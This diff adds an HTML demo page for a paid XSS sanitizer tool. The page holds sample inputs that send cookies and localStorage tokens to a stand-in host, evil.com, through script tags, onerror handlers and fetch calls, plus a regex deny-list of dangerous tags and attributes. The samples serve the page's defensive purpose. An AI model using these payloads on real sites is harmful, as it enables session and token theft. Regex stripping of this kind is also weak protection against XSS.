@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS Sanitizer — Demo | Security Kit</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{background:#0A0E1A;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;min-height:100vh}
+  .header{background:#0d1321;border-bottom:1px solid #1e2a3a;padding:16px 24px;display:flex;align-items:center;justify-content:space-between}
+  .header h1{font-size:1.1rem;color:#D500F9}.header .back{color:#D500F9;text-decoration:none;font-size:.85rem}
+  .container{max-width:960px;margin:0 auto;padding:32px 20px}
+  h2{font-size:1.5rem;margin-bottom:8px}.subtitle{color:#8899aa;margin-bottom:24px}
+  .layout{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px}
+  @media(max-width:680px){.layout{grid-template-columns:1fr}}
+  .panel{background:#0d1321;border:1px solid #1e2a3a;border-radius:12px;padding:20px}
+  .panel h3{font-size:.83rem;text-transform:uppercase;letter-spacing:.07em;color:#D500F9;margin-bottom:12px}
+  .samples{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
+  .sample-btn{background:#0A0E1A;border:1px solid #1e2a3a;color:#8899aa;padding:4px 10px;border-radius:6px;font-size:.76rem;cursor:pointer;transition:all .2s}
+  .sample-btn:hover{border-color:#D500F9;color:#fff}
+  textarea{width:100%;background:#0A0E1A;border:1px solid #1e2a3a;border-radius:6px;color:#fff;padding:10px;font-size:.82rem;outline:none;font-family:monospace;resize:vertical;transition:border-color .2s}
+  textarea:focus{border-color:#D500F9}
+  .btn{padding:10px 22px;border:none;border-radius:8px;font-size:.88rem;font-weight:600;cursor:pointer;background:#D500F9;color:#fff;margin-top:10px;transition:all .2s}
+  .btn:hover{background:#e040fb}
+  .diff-output{background:#0A0E1A;border:1px solid #1e2a3a;border-radius:8px;padding:12px;font-family:monospace;font-size:.8rem;line-height:1.7;min-height:120px;overflow-x:auto;white-space:pre-wrap;word-break:break-all}
+  .removed{color:#ef5350;text-decoration:line-through;background:rgba(229,57,53,.1);border-radius:2px}
+  .kept{color:#e0e0e0}
+  .stat-row{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px}
+  .stat{text-align:center;flex:1;min-width:80px;padding:10px;background:#0A0E1A;border-radius:8px;border:1px solid #1e2a3a}
+  .stat-num{font-size:1.3rem;font-weight:700}
+  .clean{color:#76FF03}
+  .cta-bar{text-align:center;padding:24px;background:#0d1321;border-radius:12px;border:1px solid #1e2a3a}
+  .cta-bar p{color:#8899aa;font-size:.88rem;margin-bottom:14px}
+  .btn-buy{display:inline-block;background:#D500F9;color:#fff;padding:12px 28px;border-radius:10px;font-weight:700;text-decoration:none}
+  .note{text-align:center;font-size:.75rem;color:#4a5568;margin-top:14px}
+  .crypto-pay-btn{display:inline-block;background:linear-gradient(135deg,#f7931a,#627eea);color:#fff;padding:12px 26px;border-radius:8px;font-weight:700;border:none;cursor:pointer;font-size:.9rem;margin-top:8px;transition:all .2s}
+  .crypto-pay-btn:hover{opacity:0.9;transform:translateY(-2px)}
+</style>
+</head>
+<body>
+<div class="header">
+  <h1>🧹 XSS Sanitizer — Demo</h1>
+  <a href="../index.html" class="back">← Back to Store</a>
+</div>
+<div class="container">
+  <h2>XSS Sanitizer</h2>
+  <p class="subtitle">Strip dangerous XSS payloads from user input. See exactly what gets removed before it can harm your app.</p>
+  <div class="layout">
+    <div class="panel">
+      <h3>Raw Input</h3>
+      <div class="samples">
+        <button class="sample-btn" onclick="loadSample('script')">Script tag</button>
+        <button class="sample-btn" onclick="loadSample('event')">Event handler</button>
+        <button class="sample-btn" onclick="loadSample('mixed')">Mixed attack</button>
+        <button class="sample-btn" onclick="loadSample('clean')">Clean HTML</button>
+      </div>
+      <textarea id="rawInput" rows="10" oninput="sanitize()" placeholder="Paste HTML or user input to sanitize..."></textarea>
+    </div>
+    <div class="panel">
+      <h3>Sanitized Output</h3>
+      <div class="stat-row" id="statRow">
+        <div class="stat"><div class="stat-num" id="threatCount" style="color:#ef5350">0</div><div style="font-size:.72rem;color:#8899aa">Threats Removed</div></div>
+        <div class="stat"><div class="stat-num" id="safeCount" style="color:#76FF03">0</div><div style="font-size:.72rem;color:#8899aa">Safe Elements</div></div>
+      </div>
+      <div class="diff-output" id="diffOutput"><span style="color:#4a5568">Type or paste input to see sanitization...</span></div>
+    </div>
+  </div>
+  <div class="cta-bar">
+    <p>Full version: context-aware sanitization, DOM purifier, recursive sanitization, allow-list configuration, logging.</p>
+    <a href="https://buy.stripe.com/4gMeVdbD13CCaBs3e1gjJ1R" class="btn-buy">Buy Full Version — $19</a>
+    <button class="crypto-pay-btn" data-product-slug="xss-sanitizer" data-store-slug="security-kit" data-product-name="xss-sanitizer" data-price-usd="0.00">Pay with Crypto (Save 15%)</button>
+  </div>
+  <p class="note">This demo shows limited functionality. Buy the full tool for all features.</p>
+</div>
+<script>
+const SAMPLES = {
+  script: `Hello <script>alert('XSS')</script> world!\n<script src="https://evil.com/steal.js"></script>\nNormal text here.`,
+  event: `<img src="x" onerror="document.location='https://evil.com?c='+document.cookie">\n<a href="javascript:void(fetch('https://evil.com?k='+localStorage.token))">Click me</a>\n<div onmouseover="alert(1)">Hover me</div>`,
+  mixed: `Welcome back, <b>User</b>!\n<iframe src="https://evil.com/keylogger"></iframe>\n<object data="malware.swf"></object>\n<script>new Image().src='https://evil.com?x='+document.cookie</script>\n<p>Your message: <span onload="steal()">text</span></p>\n<a href="data:text/html,<script>alert(1)</script>">link</a>`,
+  clean: `<h1>Welcome to our site</h1>\n<p>This is a <strong>safe</strong> paragraph with <a href="https://example.com">a link</a>.</p>\n<ul><li>Item one</li><li>Item two</li></ul>`
+};
+
+const DANGEROUS = [
+  { rx: /<script[\s\S]*?<\/script>/gi, label: '<script>' },
+  { rx: /<iframe[\s\S]*?(?:<\/iframe>|\/?>)/gi, label: '<iframe>' },
+  { rx: /<object[\s\S]*?(?:<\/object>|\/?>)/gi, label: '<object>' },
+  { rx: /<embed[\s\S]*?\/?>|<embed[\s\S]*?<\/embed>/gi, label: '<embed>' },
+  { rx: /\s+on\w+\s*=\s*(?:"[^"]*"|'[^']*'|[^\s>]*)/gi, label: 'event handler' },
+  { rx: /href\s*=\s*(?:"javascript:[^"]*"|'javascript:[^']*'|javascript:[^\s>]*)/gi, label: 'javascript: URI' },
+  { rx: /src\s*=\s*(?:"data:[^"]*"|'data:[^']*')/gi, label: 'data: URI' },
+  { rx: /href\s*=\s*(?:"data:[^"]*"|'data:[^']*')/gi, label: 'data: href' }
+];
+
+function loadSample(t) { document.getElementById('rawInput').value = SAMPLES[t]; sanitize(); }
+
+function sanitize() {
+  const raw = document.getElementById('rawInput').value;
+  if (!raw.trim()) {
+    document.getElementById('diffOutput').innerHTML = '<span style="color:#4a5568">Type or paste input to see sanitization...</span>';
+    document.getElementById('threatCount').textContent = 0;
+    document.getElementById('safeCount').textContent = 0;
+    return;
+  }
+  let result = raw;
+  let threats = 0;
+  const replacements = [];
+  DANGEROUS.forEach(d => {
+    const matches = [...raw.matchAll(new RegExp(d.rx.source, d.rx.flags))];
+    threats += matches.length;
+    matches.forEach(m => replacements.push({ val: m[0], label: d.label }));
+  });
+  // Build diff: highlight removals
+  let html = escapeHtmlBasic(raw);
+  replacements.forEach(r => {
+    const escaped = escapeHtmlBasic(r.val).replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    try {
+      html = html.replace(new RegExp(escaped, 'g'),
+        `<span class="removed" title="${r.label}">${escapeHtmlBasic(r.val)}</span>`);
+    } catch(e) {}
+  });
+  document.getElementById('diffOutput').innerHTML = html;
+  document.getElementById('threatCount').textContent = threats;
+  const safeTagCount = (raw.match(/<(?!script|iframe|object|embed)[a-z]/gi) || []).length;
+  document.getElementById('safeCount').textContent = safeTagCount;
+}
+
+function escapeHtmlBasic(str) {
+  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+}
+</script>
+<script src="../crypto-checkout.js"></script>
+</body>
+</html>
